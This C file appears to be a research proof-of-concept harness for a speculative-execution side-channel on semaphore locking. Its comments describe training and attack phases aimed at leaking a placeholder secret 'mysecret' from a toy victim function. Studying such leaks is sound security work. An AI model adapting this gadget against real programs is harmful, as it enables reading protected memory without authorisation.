#include <stdio.h>
#include <stdlib.h>
#include <semaphore.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define SECRET_SIZE 9
#define SECRET      "mysecret"
#define SEM_COUNT   2
#define DBG         0

void attack_func(sem_t* semaphore_ptr,
        int* sem_var_ptr, int secret_index) {
    if(sem_trywait(semaphore_ptr)!= 0) {printf("ret\n"); return;}
    *sem_var_ptr = secret_index;
    sem_post(semaphore_ptr);
}

/*
 * Variables required in cache:
 *  lock0_var
 *  secret_index
 * Variables required in mem:
 *  lock0
 *
 * Training: lock_index=1   secret_index=0
 * Attack:   lock_index=0   secret_index={iterate through SECRET}
 */
char victim_func(int secret_index) {
    sem_t semaphore;
    sem_init(&semaphore, 0, SEM_COUNT);
    int sem_var;

    sem_wait(&semaphore);
    sem_var = 0;

    attack_func(&semaphore, &sem_var, secret_index);
    char s = SECRET[sem_var];
    sem_post(&semaphore);
    sem_destroy(&semaphore);
    return s;
}

char prepare(int secret_index) {
    return victim_func(secret_index);
}

int main(int argc, char** argv) {

    char results[SECRET_SIZE];

    for (int s = 0; s < SECRET_SIZE; s++) {
        results[s] = prepare(s);
    }

    print_results_arch(results, SECRET_SIZE);


}